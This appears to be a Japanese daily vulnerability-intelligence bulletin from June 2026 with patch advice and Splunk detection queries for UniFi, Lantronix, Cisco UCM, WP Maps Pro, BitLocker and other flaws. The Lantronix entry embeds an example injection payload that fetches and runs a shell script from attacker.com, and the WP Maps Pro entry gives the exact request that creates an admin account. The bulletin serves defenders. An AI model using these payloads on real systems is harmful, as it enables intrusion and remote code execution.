@@ -1,0 +1,432 @@
+========================================
+セキュリティインテリジェンス日報 — CVE・脆弱性・ゼロデイ版
+調査日時: 2026-06-24 17:00 JST
+調査期間: 2026-06-23 17:00 〜 2026-06-24 17:00 JST
+========================================
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【ゼロデイ特報】パッチ未提供 / PoC公開済み / 実悪用確認
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+------------------------------------------------------------
+1. CVE-2026-45585 / Microsoft Windows BitLocker（YellowKey — WinRE経由BitLockerバイパス）
+対象: Windows 11 24H2 / 25H2 / 26H1（x64）、Windows Server 2022 / 2025（Server Core含む）
+------------------------------------------------------------
+
+優先度: 緊急（物理アクセス要・TPM+PIN未設定環境は即時対応必要）
+CVSS: 6.8 (Medium) ※物理アクセス必須だがbitlockerを無力化するため実環境影響は重大
+状態: ゼロデイ（パッチ提供済み 2026-06-10）/ PoC公開済み / 実悪用未確認
+パッチ提供: 2026-06-10 Microsoftがパッチを正式リリース（それ以前はゼロデイ状態）
+
+【24時間以内の変化】
+[BleepingComputer 2026-06-24] Nightmare Eclipseが新たに公開した複数のWindowsゼロデイ群（YellowKey / BlueHammer/GreenPlasma等）の続報として、BleepingComputerがYellowKey（CVE-2026-45585）のPoC詳細・攻撃手順・ビデオを報道。TPM-onlyのBitLocker設定を持つデバイスが今も無防備な状態であることが改めて注目された。
+[Nightmare-Eclipse GitHub 2026-05-22公開] PoC（YellowKey）がGitHubで公開済み。BleepingComputerでのPoC解説記事が本調査期間内に掲載。
+
+【概要】
+Windows回復環境（WinRE）のNTFSトランザクション処理に脆弱性が存在し、攻撃者が細工したFsTxファイルを含むUSBドライブまたはEFIパーティションを対象デバイスに接続してWinREに再起動させ、CTRL長押しで無制限シェルをスポーンできる。スポーンされたシェルはBitLockerで保護されたストレージボリュームに無制限アクセスが可能。TPM-onlyのBitLocker構成が対象であり、TPM+PIN構成は本攻撃に対して耐性を持つ。物理アクセスが必要であるため法人のノートPC・リモートオフィス・出張機材が主な標的となる。Nightmare Eclipseによる一連のWindows脆弱性公開キャンペーンの一環。
+
+攻撃の流れ:
+1. 攻撃者が標的デバイスに物理アクセスし、細工したFsTxファイルを含むUSBまたはEFIパーティションを接続する
+2. デバイスをWinREに再起動させ、autofstx.exeによるトランザクション処理中にCTRL長押しでシェルをスポーンする
+3. BitLockerで暗号化されたボリュームに無制限アクセスし、機密データを抽出・改ざんする
+
+【暫定緩和策】
+・BitLocker設定をTPM-onlyからTPM+PIN（またはTPM+StartupKey）へ変更する（PowerShell: manage-bde -protectors -add C: -TPMAndPIN / manage-bde -protectors -enable C:）
+・Microsoftが提供した緩和策: autofstx.exeのWinRE自動起動を防ぐ設定を適用（KB5058411 / KB5058413）
+・2026-06-10リリースのパッチを適用済みであっても、TPM-only構成のデバイスはTPM+PIN設定への変更を強く推奨
+
+【IoC】
+IoC: 確認されず（実悪用未確認・物理アクセス要のため広域IoC収集困難）
+
+【監視ポイント】
+・[Windows Event Log / Endpoint Detection] WinRE起動イベント・USBストレージの突然接続・BitLockerキーアクセスログを監視する
+Splunk SPL: index=wineventlog (EventCode=1100 OR EventCode=7045 OR EventCode=24577) | eval suspicious=if(EventCode=24577 AND NOT isnotnull(match(Message,"TPM+PIN")),"POTENTIAL_YELLOWKEY","OK") | where suspicious="POTENTIAL_YELLOWKEY" | table _time, host, Message
+→ BitLockerステータス監視はGet-BitLockerVolumeのProtectorTypeをSplunkに定期収集し、TPM-onlyホストを特定する優先度が高い
+
+【参照】
+https://www.bleepingcomputer.com/news/security/windows-bitlocker-zero-day-gives-access-to-protected-drives-poc-released/
+https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45585
+https://socprime.com/blog/cve-2026-45585-yellowkey-bitlocker-bypass/
+https://eclypsium.com/blog/yellowkey-bitlocker-bypass-windows-recovery-environment/
+https://www.helpnetsecurity.com/2026/05/20/yellowkey-bitlocker-mitigation-cve-2026-45585/
+
+------------------------------------------------------------
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【本編】真に必要な脆弱性
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+------------------------------------------------------------
+1. CVE-2026-34908 / CVE-2026-34909 / CVE-2026-34910 / Ubiquiti UniFi OS（未認証RCEチェーン）
+対象: UniFi OS Server 5.0.6以前（UDM / UDM-Pro / UDM-SE / UDM-Pro-Max / EFG / UDW / UDR各種 / UNVR / Cloud Key / Cloud Gateway / UniFi Express等）
+------------------------------------------------------------
+
+優先度: 必須
+CVSS: 10.0 (Critical) — 全3件ともCVSS 3.1 最大値
+状態: CISA KEV登録済み（2026-06-23）/ 実悪用確認 / パッチ提供済み / PoC公開済み（Bishop Fox）
+KEV期限: 2026-06-26（FCEB機関向け強制適用期限）
+
+【24時間以内の変化】
+[CISA KEV 2026-06-23] 3件全てをCISA Known Exploited Vulnerabilities Catalogに同時追加。FCEB機関に対し6/26までの修正を義務付け。
+[BleepingComputer / Security NEXT 2026-06-24] 「CISA warns of max severity Ubiquiti flaws exploited in attacks」として大規模報道。Bishop Foxが未認証RCEチェーンのPoC（無認証でroot RCEに至る完全チェーン）と無料検出スクリプトを公開。
+[Security NEXT 2026-06-24] 「UbiquitiやLantronix製品の脆弱性悪用に注意喚起 — 米当局」として国内報道あり（参考A昇格トリガー）
+
+【概要】
+Ubiquiti UniFi OSに3つのCVSS 10.0脆弱性が存在し、連鎖することでネットワーク到達可能な未認証攻撃者がroot権限でのリモートコード実行を達成できる。CVE-2026-34908はアクセス制御不備でシステム設定変更を可能にし、CVE-2026-34909はパストラバーサルで配下OSの任意ファイル読み取りを可能にし、CVE-2026-34910はコマンドインジェクションで任意OSコマンド実行を可能にする。Ubiquitiは2026-05-21にUniFi OS Server 5.0.8で修正済みだが、CISAが実悪用確認を受けてKEV追加。国内でもUniFiルータ・ゲートウェイはSOHO〜中堅企業で広く普及しており、インターネット境界機器として優先対応が必要。対処: UniFi OS Server 5.0.8以降（またはモデル別固定バージョン）へ即時更新。
+
+攻撃の流れ:
+1. インターネット・内部ネットワーク経由でUniFi OS管理インターフェースに到達する（認証不要）
+2. CVE-2026-34908でアクセス制御をバイパスし、CVE-2026-34909でシステムファイル・認証情報を読み取る
+3. CVE-2026-34910のコマンドインジェクションでroot権限のOSコマンドを実行し、バックドア・マルウェアを展開する
+
+【IoC】
+IoC: 確認されず（CISA発表時点で具体的IOC未公開、Bishop Foxのデモ環境由来のものが非公開）
+
+【監視ポイント】
+・[Ubiquiti UniFi OS syslog / ネットワークファイアウォール] 管理ポート（TCP 443 / 8443）への外部IPからの異常アクセスを検知する
+Splunk SPL: index=network sourcetype=ubiquiti:unifi (uri_path="*/api/*" OR uri_path="*/proxy/network/*") NOT src_ip IN ("192.168.0.0/16","10.0.0.0/8","172.16.0.0/12") | stats count by src_ip, uri_path | where count > 10 | sort -count
+→ UniFi OS管理APIへの外部IPからのアクセスは正常運用でほぼ発生しない。1件でも検出された場合は侵害調査を優先する
+Splunk SPL: index=network sourcetype=ubiquiti:unifi action=command_exec | table _time, src_ip, command, user
+→ コマンド実行ログがある場合は即時アラート対象
+
+【参照】
+https://www.bleepingcomputer.com/news/security/cisa-warns-of-max-severity-ubiquiti-flaws-exploited-in-attacks/
+https://www.security-next.com/186316
+https://community.ui.com/releases/Security-Advisory-Bulletin-064-064/84811c09-4cf4-42ab-bd61-cc994445963b
+https://www.cisa.gov/news-events/alerts/2026/06/23/cisa-adds-four-known-exploited-vulnerabilities-catalog
+
+
+------------------------------------------------------------
+2. CVE-2025-67038 / Lantronix EDS5000（未認証root権限コマンドインジェクション）
+対象: Lantronix EDS5000 2.1.0.0R3以前
+------------------------------------------------------------
+
+優先度: 必須
+CVSS: 9.8 (Critical)
+状態: CISA KEV登録済み（2026-06-23）/ 実悪用確認 / パッチ提供済み
+KEV期限: 2026-06-26（FCEB機関向け強制適用期限）
+
+【24時間以内の変化】
+[CISA KEV 2026-06-23] CISA Known Exploited Vulnerabilities Catalogに追加。KEV期限2026-06-26。
+[Security NEXT 2026-06-24] Ubiquitiと同記事で国内報道（参考A昇格トリガー）
+
+【概要】
+Lantronix EDS5000シリアル-イーサネット変換サーバのHTTP RPCモジュールがログイン失敗時のユーザー名からシェルコマンドを構築する際にサニタイズを行わない。未認証攻撃者はユーザー名フィールドにOSコマンドを埋め込み、root権限で任意コマンドを実行できる。EDS5000は工場・病院・電力施設等のOT/IT境界に使われるシリアルデバイスサーバであり、侵害されると物理デバイスの制御網への足掛かりとなる。対処: EDS5000 2.2.0.0R1へ即時アップグレード。
+
+攻撃の流れ:
+1. インターネット接続のLantronix EDS5000のHTTP RPC（ログインエンドポイント）へ未認証HTTPリクエストを送信する
+2. ユーザー名パラメータにシェルコマンド（例: ;/bin/sh -c 'wget attacker.com/shell.sh -O /tmp/s && sh /tmp/s'）を埋め込む
+3. rootとしてコマンドが実行され、OT機器制御ネットワーク内への永続化・横展開が行われる
+
+【IoC】
+IoC: 確認されず
+
+【監視ポイント】
+・[OT/ネットワークファイアウォール / IDS] EDS5000管理ポートへの外部IPからのHTTPアクセスを検知する
+Splunk SPL: index=network sourcetype=firewall_or_ids dest_port IN (80, 443, 10000) dest_ip=<EDS5000_IPリスト> NOT src_ip IN ("10.0.0.0/8","172.16.0.0/12","192.168.0.0/16") | table _time, src_ip, dest_ip, dest_port, action
+→ EDS5000はインターネット直接露出を避けるべき機器。外部からのアクセスが1件でもあれば調査優先
+
+【参照】
+https://thehackernews.com/2026/06/cisa-warns-critical-lantronix-eds5000.html
+https://www.cisa.gov/news-events/ics-advisories/icsa-26-069-02
+https://www.security-next.com/186316
+
+
+------------------------------------------------------------
+3. CVE-2026-20230 / Cisco Unified Communications Manager（SSRF→root権限RCE・ウェブシェル展開）
+対象: Cisco Unified CM 14.x（14SU6未満）/ 15.x（15SU5未満・15SU5は2026年9月予定、暫定COP提供中）
+------------------------------------------------------------
+
+優先度: 必須
+CVSS: 8.6 (High) ※Cisco自身はCritical SIR（実効impact: root権限RCE）と判定
+状態: 実悪用確認（2026-06-22〜23 PoC公開後即日攻撃観測）/ PoC公開済み（SSD Secure Disclosure 2026-06-24）/ KEV未登録（近日追加見込み）
+
+【24時間以内の変化】
+[Help Net Security / BleepingComputer 2026-06-24] Defusedが6/23〜24のハニーポット観測でTor経由の自動ウェブシェル展開攻撃を確認。「WebDialer SSRFでApache Axisサービスを不正展開し2段階JSPシェルを書き込む」完全PoC手順が公開された。
+[SSD Secure Disclosure 2026-06-24] SSRF→root権限昇格の技術的詳細とPoC手順を公開。
+[Cisco 2026-06-03] 脆弱性開示時点でPoC存在を確認済みと発表（悪用未確認と表明していたが週末以降攻撃観測）
+
+【概要】
+Cisco Unified CM / Unified CM SMEのWebDialerコンポーネントにSSRF脆弱性（不適切なHTTPリクエスト入力検証）が存在し、未認証のリモート攻撃者がfile://スキームのURIを使って任意ファイルをOSに書き込める。攻撃者は1）ホスト名取得、2）WebDialer SSRF経由で不正Apache Axisサービス展開、3）1段階目JSPファイルライター設置、4）2段階目コマンド実行シェル（/platform-services/axis2-web/以下）設置、という4段階でroot権限の永続シェルを確立する。Cisco UCMは大規模企業の電話・コラボレーション基盤であり、侵害されると内部ネットワーク全体への足掛かりとなる。15.x向けの恒久パッチは2026年9月予定のため暫定COP適用が必要。
+
+攻撃の流れ:
+1. 未認証攻撃者がCisco Unified CMのWebDialerエンドポイントへfile://URIを含む細工HTTPリクエストを送信する
+2. SSRFを利用して不正なApache Axis2サービスをデプロイし、1段階目のJSPファイルライターを/platform-services/以下に書き込む
+3. 2段階目のコマンド実行シェルを展開し、rootとしてOSコマンドを実行・バックドアを永続化する
+
+【IoC】
+IP: Tor出口ノード経由の分散攻撃（特定IP確認困難）
+Hash: 確認されず
+Path: /platform-services/axis2-web/<ランダム名>.jsp（ウェブシェル設置パス）
+
+【監視ポイント】
+・[Cisco UCM Application Logs / Web Access Log] /platform-services/axis2-web/以下への予期しないJSPファイル作成・アクセスを検知する
+Splunk SPL: index=ciscoapp sourcetype=cisco:ucm:access_log (uri_path="*/axis2-web/*.jsp" OR uri_path="*/WebDialer/*") | eval anomaly=if(match(uri_path,"axis2-web"),"SHELL_ACCESS","SSRF_ATTEMPT") | table _time, src_ip, uri_path, anomaly, status
+→ axis2-web配下の*.jspへのPOSTリクエストは正常運用では発生しない。即時調査対象とする
+Splunk SPL: index=ciscoapp sourcetype=cisco:ucm:audit process="java" (cmdline="*wget*" OR cmdline="*curl*" OR cmdline="*chmod*") | table _time, host, cmdline
+→ UCMプロセスからの外部通信・chmod実行は侵害の強い指標
+
+【参照】
+https://www.bleepingcomputer.com/news/security/cisco-unified-cm-sme-flaw-cve-2026-20230-now-exploited-in-attacks/
+https://www.helpnetsecurity.com/2026/06/24/cisco-unified-cm-flaw-exploited-to-drop-webshells-cve-2026-20230/
+https://www.securityweek.com/hackers-exploiting-cisco-unified-cm-vulnerability/
+
+
+------------------------------------------------------------
+4. CVE-2026-8732 / WP Maps Pro WordPress プラグイン（未認証管理者アカウント作成 → サイト完全掌握）
+対象: WP Maps Pro 6.1.0以前（インストール数15,000+サイト）
+------------------------------------------------------------
+
+優先度: 必須
+CVSS: 9.8 (Critical)
+状態: 実悪用確認（Wordfence 24h内2,858件ブロック）/ パッチ提供済み（6.1.1）/ KEV未登録
+
+【24時間以内の変化】
+[The Hacker News / SecurityWeek 2026-06-24] 「Critical WP Maps Pro Flaw Actively Exploited to Create Admin Accounts」として大規模報道。Wordfenceが過去24時間で2,858件の攻撃ブロックを確認。
+[WordPress.org 2026-06-24] 修正版6.1.1がリリース済み。
+
+【概要】
+WP Maps Proのサポート一時アクセス機能のAJAXアクション（wpgmp_temp_access_ajax）がwp_ajax_nopriv_フックに登録されており未認証で呼び出し可能。nonceチェックがあるが、nonceはwp_localize_scriptでフロントエンドページに公開されているため誰でも取得可能。check_temp=falseパラメータでwp_insert_user()によるadministratorロールの新規アカウントが作成され、マジックログインURLが返される。攻撃者はこのURLでログインし完全なWordPress管理者権限を得る。対処: 6.1.1への即時更新。更新困難な場合はプラグインを一時無効化する。
+
+攻撃の流れ:
+1. 攻撃者がWP Maps Proが有効なサイトのフロントエンドからnonceを取得する
+2. wp-admin/admin-ajax.php?action=wpgmp_temp_access_ajaxにcheck_temp=falseでPOSTリクエストを送信し管理者アカウントを作成する
+3. 返されたマジックURLでログインし、WordPress管理者としてバックドアプラグイン・ウェブシェルを設置する
+
+【IoC】
+IoC: 確認されず（汎用的なWordPress exploit routineによる攻撃のため固有IOCは少ない）
+URI: /wp-admin/admin-ajax.php（action=wpgmp_temp_access_ajax かつ check_temp=false）
+
+【監視ポイント】
+・[WordPress / Web Access Log] admin-ajax.phpへのwpgmp_temp_access_ajax呼び出しを検知する
+Splunk SPL: index=webserver sourcetype=access_combined uri_path="/wp-admin/admin-ajax.php" cs_uri_query="*wpgmp_temp_access*" | stats count by src_ip, _time | where count > 1 | sort -count
+→ このAJAXアクションへのアクセスは正常な管理者操作にはほぼ現れない。1件でも検出時はWordPressユーザー一覧を即時確認する
+
+【参照】
+https://thehackernews.com/2026/06/critical-wp-maps-pro-flaw-actively.html
+https://www.securityweek.com/wp-maps-pro-vulnerability-exploited-to-take-over-wordpress-sites/
+https://securityaffairs.com/192977/hacking/cve-2026-8732-the-wp-maps-pro-flaw-that-lets-anyone-create-a-wordpress-admin-without-a-password.html
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【参考情報 A】国内で影響・被害が確認されているもの
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+昇格理由: Security NEXT 2026-06-24 報道（Ubiquiti / Lantronix KEV警告、ManageEngine、NVIDIA NeMo）
+
+------------------------------------------------------------
+・CVE-2026-11374 / ManageEngine ADSelfService Plus / RecoveryManager Plus / M365 Manager Plus / ADAudit Plus（SSO認証チケット予測によるアカウント乗っ取り）
+対象: ADSelfService Plus 6528以前 / RecoveryManager Plus 6320以前 / M365 Manager Plus 4816以前 / ADAudit Plus 8702以前
+CVSS: 9.0 (Critical)
+状態: パッチ提供済み / 実悪用未確認 / PoC未公開（バグバウンティ経由で発見）
+------------------------------------------------------------
+
+【24時間以内の変化】
+[Security NEXT 2026-06-24] 「ManageEngineの複数製品でアカウント乗っ取りのおそれ」として国内報道。AD360統合製品群のSSO認証が共通の脆弱性を持つことが改めて注目された。
+[ManageEngine 2026-06-03〜12] 各製品の修正バージョンを順次リリース。
+
+【概要】
+ManageEngine AD360に統合された複数製品（ADSelfService Plus・RecoveryManager Plus・M365 Manager Plus・ADAudit Plus）がSSO認証チケットを予測可能な方式で生成しており、未認証ユーザーがチケットを予測してターゲットアカウントを乗っ取ることができる。ManageEngineはAD管理・パスワードリセット・M365管理・AD監査といった高権限操作を担うため、侵害されると組織の全AD環境が掌握される可能性がある。国内でもAD環境のID管理基盤として広く使用されており影響範囲が大きい。対処: 各製品を以下の修正バージョンへ即時更新 — ADSelfService Plus 6529 / RecoveryManager Plus 6321 / M365 Manager Plus 4817 / ADAudit Plus 8703。
+
+【IoC】
+IoC: 確認されず（バグバウンティ経由の報告のため悪用IOC未確認）
+
+【監視ポイント】
+・[ManageEngine Application Log / AD Event Log] 短時間での複数アカウントへのSSO認証試行・正常認証に見えるチケット検証の異常パターンを検知する
+Splunk SPL: index=manageengine sourcetype=adselfservice:log (action="SSO_TICKET_VALIDATE" OR action="LOGIN_SUCCESS") | bucket _time span=5m | stats dc(user) as unique_users, count by _time, src_ip | where unique_users > 5 OR count > 20 | sort -_time
+→ 同一IPから短時間で多数アカウントへのSSO成功は、チケット予測攻撃の指標。正規の管理者操作と区別するためsrc_ipと時間帯を確認する
+
+【参照】
+https://www.security-next.com/186303
+https://cvefeed.io/vuln/detail/CVE-2026-11374
+https://www.manageengine.com/network-monitoring/security-updates/
+
+JPCERT/CC・IPA 発行状況（24h 窓内）:
+未発行: CVE-2026-11374 — 24時間窓内にJPCERT/CC・IPA発行確認されず
+
+------------------------------------------------------------
+・CVE-2026-24155 / CVE-2026-24252 / CVE-2026-24228 / NVIDIA NeMo AIフレームワーク（コードインジェクション・コマンドインジェクション・安全でないデシリアライゼーション）
+対象: NVIDIA NeMo 2.7.2以前（Linux環境でCVE-2026-24252・CVE-2026-24228が該当）
+CVSS: 7.8 (High)
+状態: パッチ提供済み（2.7.3）/ 実悪用未確認 / PoC未確認
+------------------------------------------------------------
+
+【24時間以内の変化】
+[Security NEXT 2026-06-24] 「AI開発向けフレームワーク『NVIDIA NeMo』に複数脆弱性」として国内報道。AI開発用インフラへの脅威として注目度が高い。
+[NVIDIA 2026-06-16] NeMo 2.7.3で修正リリース。
+
+【概要】
+NVIDIAのAIモデル開発・学習フレームワークNeMoに3件の脆弱性が存在する。CVE-2026-24155はコードインジェクション、CVE-2026-24252（Linux専用）はOSコマンドインジェクション、CVE-2026-24228（Linux専用）は安全でないデシリアライゼーションであり、いずれもローカル環境から低権限で悪用でき、コード実行・権限昇格・情報漏洩・データ改ざんを引き起こし得る。AI開発環境や学習基盤サーバへの侵害起点として利用される可能性があり、クラウド上の学習クラスタや共有MLOps環境での影響が大きい。対処: NeMo 2.7.3へ即時更新。
+
+【IoC】
+IoC: 確認されず
+
+【監視ポイント】
+・[MLOps環境 / Linux syslog / auditd] NeMoサービスアカウントからの異常プロセス起動・ネットワーク通信を検知する
+Splunk SPL: index=linux_syslog sourcetype=syslog (process="nemo*" OR process="python3" ) (message="*exec*" OR message="*curl*" OR message="*wget*") | table _time, host, process, message, user
+→ NeMoプロセスからの外部HTTP通信・execシステムコールは正常運用では限定的。MLOps環境の外部通信ポリシーと照合する
+
+【参照】
+https://www.security-next.com/186297
+
+JPCERT/CC・IPA 発行状況（24h 窓内）:
+未発行: CVE-2026-24155/24252/24228 — 24時間窓内にJPCERT/CC・IPA発行確認されず
+
+------------------------------------------------------------
+・KDDI大規模クレデンシャル流出（調査継続）/ インシデント報告 — CVE番号未割当（第三者ソフトウェア脆弱性悪用）
+対象: KDDIが提供するメールサービス基盤（STNet / KDDI Web Communications / JCOM / 中部テレコミュニケーション / ニフティ / ビッグローブ）利用者 最大1,422万アカウント
+CVSS: 該当なし（インシデント報告）
+状態: KDDI公式開示（2026-06-24）/ 実被害確認 / 攻撃ベクター特定調査中
+------------------------------------------------------------
+
+【24時間以内の変化】
+[KDDI / Japan Times / The Register 2026-06-24] KDDIが2026-06-17に検知した不正アクセスを2026-06-24に公式開示。最大1,422万件のメールアドレス・パスワードが流出した可能性。パスワードはハッシュ・暗号化済みだが、クレデンシャルスタッフィング・BEC攻撃への悪用リスクが高い。攻撃ベクターは第三者ソフトウェアの脆弱性悪用と発表されたが、具体的なCVEは未特定。
+
+【概要】
+KDDIが複数の国内ISP向けに提供するメールサービス基盤が2026-06-17以前に侵害され、最大1,422万件のメールアドレス・パスワード（ハッシュ/暗号化済み）が流出した可能性がある。影響ISPはSTNet・KDDI Web Communications・JCOM・中部テレコミュニケーション・ニフティ・ビッグローブの6社。KDDIは6/17当日に侵入を検知して止めたと発表したが、侵害開始日・流出データの完全な範囲・利用された脆弱性CVEは調査中。前回予報（クレデンシャルスタッフィング・BEC攻撃リスク）はこの大規模開示により部分的中と判定される。被害組織のユーザー向けにはパスワード変更・多要素認証設定を即時推奨する。
+
+攻撃の流れ:
+1. 攻撃者がKDDIメールサービス基盤で使用されていた第三者ソフトウェアの脆弱性を悪用してサーバに侵入する
+2. メールアドレスとハッシュ/暗号化パスワードのデータベースを窃取する
+3. 窃取したクレデンシャルをクレデンシャルスタッフィング（他サービスへの自動ログイン試行）やBECに悪用する（継続リスク）
+
+【IoC】
+IoC: 確認されず（KDDI調査中・具体的なC2・攻撃インフラ未公開）
+
+【監視ポイント】
+・[認証ログ / SIEM] KDDIグループISP（STNet / JCOM / ニフティ / ビッグローブ 等）のメールドメインを持つ自組織アカウントへの異常ログイン試行を監視する
+Splunk SPL: index=authentication (user="*@stnet.co.jp" OR user="*@jcom.zaq.ne.jp" OR user="*@nifty.com" OR user="*@biglobe.ne.jp") action=failure | bucket _time span=10m | stats count by _time, user, src_ip | where count > 5 | sort -count
+→ 漏洩クレデンシャルを使ったスタッフィング攻撃は数時間〜数日以内に始まる可能性が高い。VPNログイン・メールクライアント認証も合わせて確認する
+
+【参照】
+https://www.theregister.com/cyber-crime/2026/06/24/you-have-got-to-be-kddi-ng-japanese-telco-exposes-142-million-managed-email-credentials/5260555
+https://www.japantimes.co.jp/business/2026/06/24/companies/kddi-data-breach-cyberattack/
+https://newsroom.kddi.com/news/assets/2026/kddi_nr_s-71_4593/kddi_nr_s-71_4593_pdf_01.pdf
+https://www.infosecurity-magazine.com/news/kddi-breach-japanese-telcos/
+
+JPCERT/CC・IPA 発行状況（24h 窓内）:
+未発行: KDDI侵害 — 24時間窓内にJPCERT/CC・IPA発行確認されず（KDDI公式プレスリリース・各メディア報道のみ）
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【参考情報 B】海外で先行・国内波及に注意
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+・CVE-2026-41089 / Windows Netlogon（未認証0-click RCE・ドメインコントローラ完全掌握）
+CVSS: 9.8 (Critical)
+Windowsドメインコントローラ（Windows Server 2012 R2〜2025）のNetlogonサービスにスタックベースバッファオーバーフローが存在し、ネットワーク到達可能な未認証攻撃者がSYSTEM権限でのリモートコード実行を達成できる（0-click）。ベルギーCCBが2026-05-29に実悪用確認を発表したが、MicrosoftはNVD上で「exploitation: none」と記録（矛盾あり）。Microsoftは5月Patch Tuesdayでパッチ提供済み（2026-05-12）。KEV未登録だが実悪用の証拠があるため参考B掲載。環境内の全DCが同じメンテナンスウィンドウでパッチ適用されていないと、未パッチDCが即座に攻撃対象になる点に注意。対処: 2026年5月累積更新プログラムを全DCへ適用済みか確認し、未適用DCを優先パッチ適用する。
+IoC: 確認されず
+
+監視: [Windows Security Event Log] DCへのNetlogon RPC認証失敗・異常なサービスチケット発行を検知する
+Splunk SPL: index=wineventlog EventCode IN (4625, 4769, 5805) ComputerName=*<DCホスト名>* | bucket _time span=1m | stats count by _time, IpAddress, TargetUserName, EventCode | where count > 20 | sort -count
+→ EventCode 5805（Netlogon接続失敗）の大量発生はNetlogon RCE探索の指標。正常なDC間レプリケーションと区別するためsrc_ipのDC一覧を除外する
+
+参照: https://www.securityweek.com/critical-windows-netlogon-vulnerability-in-attackers-crosshairs/
+https://www.helpnetsecurity.com/2026/06/01/windows-netlogon-rce-exploited-cve-2026-41089/
+https://nvd.nist.gov/vuln/detail/cve-2026-41089
+
+------------------------------------------------------------
+
+・CVE-2026-49975 / Apache HTTP Server（HTTP/2 Bomb — メモリ枯渇DoS、4000倍増幅）
+CVSS: 8.7 (CVSSv4.0) / 7.5 (CVSSv3.1)
+Apache HTTP Server 2.4.17〜2.4.67のmod_http2にHPACK圧縮爆弾とHTTP/2 Slowlorisホールドを組み合わせたDoS脆弱性。単一クライアント100Mbpsで32GBのRAMを10〜45秒で枯渇させWebサーバを即時ダウンさせられる。PoC（docker lab・per-server解説含む）はGitHubで公開済み。NGINX（2026-04修正済み）・Microsoft IIS・Envoy・Cloudflare Pingora等にも類似の影響あり（IIS・Envoyは未パッチ）。国内Web基盤での影響が大きい。対処: Apache HTTPD 2.4.68（2026-06-08リリース）へ即時更新。mod_http2を2.0.41以降に更新する。IIS/Envoy利用組織はベンダー対応待ちの間WAFまたはリバースプロキシでのHPACK制限を設定する。
+IoC: 確認されず（DoS攻撃のためパケットパターンが主な指標）
+
+監視: [Apache Access/Error Log / ネットワークモニタリング] HTTP/2大量ヘッダーリクエストによるメモリ急増を検知する
+Splunk SPL: index=webserver sourcetype=apache:access http2=true | bucket _time span=1m | stats count, dc(src_ip) as unique_src by _time, host | where count > 1000 OR unique_src < 5 | sort -count
+→ HTTP/2接続で少数IPから大量リクエストが短時間集中する場合はHTTP/2 Bomb攻撃の指標。Cloudflareのようなフロントエンドがある場合は上流の接続数も確認する
+
+参照: https://www.securityweek.com/http-2-bomb-exploit-knocks-web-servers-offline-in-seconds/
+https://blog.calif.io/p/codex-discovered-a-hidden-http2-bomb
+https://www.bleepingcomputer.com/news/security/new-http-2-bomb-dos-attack-crashes-web-servers-in-under-a-minute/
+
+------------------------------------------------------------
+
+・CVE-2026-8461継続監視 / FFmpeg PixelSmash（前回予報の更新）
+CVSS: 8.8 (High)
+前回（2026-06-23）参考B掲載。本調査期間内に新規実悪用・IOC公開は確認されず。JFrogの技術解析ではASLR無効環境でのRCE実証済みだが、実際の攻撃には配信メカニズム（媒体ファイルアップロード受容サービス）が必要。Jellyfin・Nextcloud・OBS Studio等の更新を継続推奨。継続監視中。
+
+参照: https://jfrog.com/blog/pixelsmash-critical-ffmpeg-vulnerability-turns-media-files-into-weapons/
+https://www.bleepingcomputer.com/news/security/ffmpeg-fixes-pixelsmash-flaw-in-widely-used-video-decoder/
+
+------------------------------------------------------------
+
+・CVE-2026-26-11645継続監視 / Chrome V8（前回予報の更新）
+前回（2026-06-23）本編掲載・FCEB期限到来。本調査期間内に新規APT帰属キャンペーン・IOC公開は確認されず（参照: SOCPrime分析）。実悪用は継続中と評価されるが帰属グループ未特定のまま。継続監視中。
+
+参照: https://socprime.com/blog/cve-2026-11645-chrome-zero-day-vulnerability-exploited-in-the-wild/
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【APT活動 — 本編】高信頼・大規模キャンペーン
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+該当なし（本調査期間24時間以内に新規の政府機関公式帰属・合同勧告・大規模キャンペーン初報は確認されず）
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【APT活動 — 注目動向】信頼性高・規模限定 / 規模大・帰属未確定
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+・Nightmare Eclipse / Windows脆弱性連続開示キャンペーン（国家帰属: 不明 / 帰属信頼度: 低・個人または小グループ）
+活動タイプ: 新規TTP / ゼロデイ連続公開
+採用契機: S（新規TTP・YellowKey/GreenPlasma PoC公開）
+標的: Windowsエンドポイント全般
+本調査期間内にYellowKey（CVE-2026-45585 BitLockerバイパス）・GreenPlasma（CVE未割当・Windows CTFMON権限昇格・不完全PoC）のPoC詳細が公開・解説された。BleepingComputerの報道によれば、これらはMicrosoftとの脆弱性報告プロセスへの不満から公開されたものとされる。過去に公開したBlueHammer（CVE-2026-33825）・RedSun（CVE-2026-41091）・UnDefend（CVE-2026-45498）は既に悪用確認済みでKEV登録済み（2026-05）。今回公開された脆弱性も時間差で国家系APT・ランサムウェアグループが武器化するパターンが過去に観測されており、継続監視が必要。
+推奨アクション: CVE-2026-45585（YellowKey）は2026-06-10パッチ適用済みか確認。TPM+PIN設定変更を優先実施する。CVE-2026-41091 / CVE-2026-45498は5月Patch Tuesdayパッチ（KB5058379等）を全Windows端末に適用済みか確認する。
+参照: https://cipherssecurity.com/nightmare-eclipse-microsoft-windows-zero-day/
+https://www.picussecurity.com/resource/blog/bluehammer-redsun-windows-defender-cve-2026-33825-zero-day-vulnerability-explained
+https://cybersecuritynews.com/microsoft-clarifies-nightmare-eclipse-controversy/
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+【攻撃予報（48〜72時間）】
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+・予報1: Cisco Unified CM未パッチ環境はCVE-2026-20230ウェブシェル調査を48時間内に実施すべき
+Tier: T1（進行中の攻撃の継続・拡大）
+確度: 高
+根拠:
+  Evidence: [Help Net Security / BleepingComputer 2026-06-24] Tor経由の自動ウェブシェル展開攻撃がハニーポット観測で確認。/platform-services/axis2-web/以下への2段階JSPシェル設置が具体的な攻撃手順として報告された。
